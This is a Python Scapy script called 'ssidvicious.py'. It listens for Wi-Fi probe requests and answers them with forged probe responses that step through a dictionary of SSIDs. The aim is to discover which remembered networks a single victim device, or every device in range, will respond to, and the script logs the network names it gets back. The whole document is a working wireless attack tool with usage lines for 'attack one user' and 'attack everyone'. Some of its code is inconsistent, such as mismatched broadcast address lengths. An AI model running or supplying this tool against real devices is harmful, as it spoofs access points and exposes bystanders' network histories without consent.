#!/usr/bin/env python
#ssidvicious.py <victim MAC> <repeat ssid frame> <dict-lines-at-a-time> <dictfile>
#
#ssidvicious.py aa:bb:cc:dd:ee 3 10 ssiddict.txt [attack one user]
#ssidvicious.py ff:ff:ff:ff:ff 3 10 ssiddict.txt [attack everyone]

import sys, re, datetime 
import re
from scapy.all import *
from netaddr import *

x = 0
B = 0
eof = 0
source_mac = "00:c0:ca:61:dd:08"
whitelist = ['lg', 'samsung']
#whitelist = []
logfile = open('results.txt', 'w')
mcloc = {}

def PacketHandler(pkt) :
	if pkt.haslayer(Dot11) :
		if pkt.type == 0 and pkt.subtype == 4:
			global B
			global x
			global eof
			global whitelist

			mac = EUI(pkt.addr2)
			#Brute individial client
			if len(sys.argv) > 1 and (pkt.addr2 == sys.argv[1] or pkt.addr1 == "ff:ff:ff:ff:ff") and pkt.info != "" :			
				print time.strftime("%H:%M"), "Directed Request: MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)
				print >> logfile, time.strftime("%H:%M"), "Directed Request: ", mac.oui.registration().org, "- MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)
			elif len(sys.argv) > 1 and pkt.addr2 == sys.argv[1] and pkt.info == "" :
				try:
					print time.strftime("%H:%M"), B, "- 1 Generic Broadcast: ", mac.oui.registration().org,"%s with Seq: %s " %(pkt.addr2, pkt.SC)
				except NotRegisteredError:
					print time.strftime("%H:%M"), B, "- 2 Generic Broadcast: %s with Seq: %s " %(pkt.addr2, pkt.SC)
				with open(sys.argv[4]) as f:
					lines = list(f)
					B = B + int(sys.argv[3])
					while x <= B and eof != 1:
						i = 0
						while i <= int(sys.argv[2]):
							try: 
                                                                packetsend(pkt, lines)
							        i = i + 1
							except IndexError:
								print 'Finished SSIDs in dictionary file'
								eof = 1
								break
						x = x + 1				

			#Brute everything (in whitelist)
			try: 
				ouiname = mac.oui.registration().org
				ouiname = ouiname.lower()
			except NotRegisteredError:
				ouiname = "unknown"

			if len(sys.argv) > 1 and sys.argv[1] == "ff:ff:ff:ff:ff:ff" and pkt.addr2 != source_mac and pkt.info == "" and (any(x in ouiname for x in whitelist) or not whitelist):
				if pkt.addr2 not in mcloc :
					mcloc[pkt.addr2] = pkt.addr2
					B = 0
					x = 0
				else :
					B = mcloc[pkt.addr2]

				with open(sys.argv[4]) as f:
					lines = list(f)
					B = B + int(sys.argv[3])
					mcloc.update({pkt.addr2 : B}) 
					try:
						print time.strftime("%H:%M"), B, "- Generic Broadcast: ", mac.oui.registration().org,"%s with Seq: %s " %(pkt.addr2, pkt.SC)
					except NotRegisteredError:
						print time.strftime("%H:%M"), B, "- Generic Broadcast: %s with Seq: %s " %(pkt.addr2, pkt.SC)
					while x <= B and eof != 1:
						i = 0
						while i <= int(sys.argv[2]):
							try: 
								packetsend(pkt, lines)
							        i = i + 1
							except IndexError:
								print 'Finished SSIDs in dictionary file. Starting again.'
								eof = 1
								#x = 0
								break
						x = x + 1				

			elif len(sys.argv) > 1 and (sys.argv[1] == "ff:ff:ff:ff:ff" and pkt.addr1 == source_mac) and pkt.info != "" :
				print time.strftime("%H:%M"), "Directed Request: ", mac.oui.registration().org, "- MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)
                                print >> logfile, time.strftime("%H:%M"), "Directed Request: ", mac.oui.registration().org, "- MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)

def packetsend(pkt, lines):
	#print 'sening packet'
	if sys.argv[1] == "ff:ff:ff:ff:ff:ff":
		pktdst = pkt.addr2
	elif sys.argv[1] != "ff:ff:ff:ff:ff:ff":
		pktdst = sys.argv[1]

	sendp(RadioTap()/Dot11(addr1=pktdst,addr2=source_mac,addr3=source_mac, SC=pkt.SC)/
	Dot11ProbeResp(cap=0x0401)/
	Dot11Elt(ID="SSID",info='%s' %(lines[x].strip()))/
	Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16'),iface="mon0",loop=0, verbose=0)


sniff(iface="mon0", prn = PacketHandler)
